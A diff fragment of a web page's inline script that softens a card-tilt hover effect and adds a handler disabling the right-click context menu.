         card.addEventListener('mousemove', (e) => {
             const rect = card.getBoundingClientRect();
@@ -860,14 +720,17 @@ footer{
             const y = e.clientY - rect.top;
             const centerX = rect.width / 2;
             const centerY = rect.height / 2;
-            const rotateX = (y - centerY) / 25;
-            const rotateY = (centerX - x) / 25;
-            card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-10px)`;
+            const rotateX = (y - centerY) / 30;
+            const rotateY = (centerX - x) / 30;
+            card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-5px)`;
         });
         card.addEventListener('mouseleave', () => {
             card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) translateY(0px)';
         });
     });
+    
+    // Empêcher le clic droit
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
 })();
 </script>
 </body>
